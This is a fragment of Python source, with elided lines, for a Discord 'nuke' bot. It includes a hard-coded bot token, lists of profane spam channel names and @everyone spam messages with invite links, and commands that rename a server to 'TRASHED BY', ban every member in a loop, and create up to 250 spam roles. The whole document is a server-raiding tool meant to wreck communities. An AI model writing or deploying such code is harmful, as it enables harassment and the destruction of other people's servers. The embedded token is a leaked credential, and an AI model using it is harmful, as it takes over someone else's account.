...
token = " MTE3OTA3ODExNDAxMDIwNjI5OA.GN2o58.m8yDQTQppxPm8MuouiLGDYVtJugLKnwrvgKTEQ "

channel_names = ['Fucked by broken papa', 'broken on top', 'Fucked By broken papa', 'broken op', 'Fucked bye broken papa']
message_spam = ['# @everyone broken RUNS U ', '@everyone broken RUNS U  JOIN NOW https://discord.gg/roxonfire', '@everyone broken  RUNS U JOIN NOW https://discord.gg/urontop', '@everyone FUCKED BY broken https://discord.gg/urontop']
webhook_names = ['broken On Top', 'broken On Top']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "made by brokenz || .gg/urontop"))#change this if you want
  print(f'''
...
async def nuke(ctx, amount=50):
  ...
  await ctx.guild.edit(name="TRASHED BY brokenzz | zzxxzzzzzz ")#change this if u want
  ...
  for i in range(100):  
    ...
    for member in list (ctx.guild.members):
        try:
          await member.ban(reason="broken Nuke Bot")#change this if u want
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NUKE BY broken ")
...
async def help(ctx, *args):
    ...
    embed = discord.Embed(color=14177041,title="broken Nuke Bot 24/7")
    embed.add_field(name="broken Nuke Bot Help Commands",value=retStr)
    embed.set_footer(text=f"Requested By {ctx.author} |  Nuke Bot 24/7 | Made By broken")
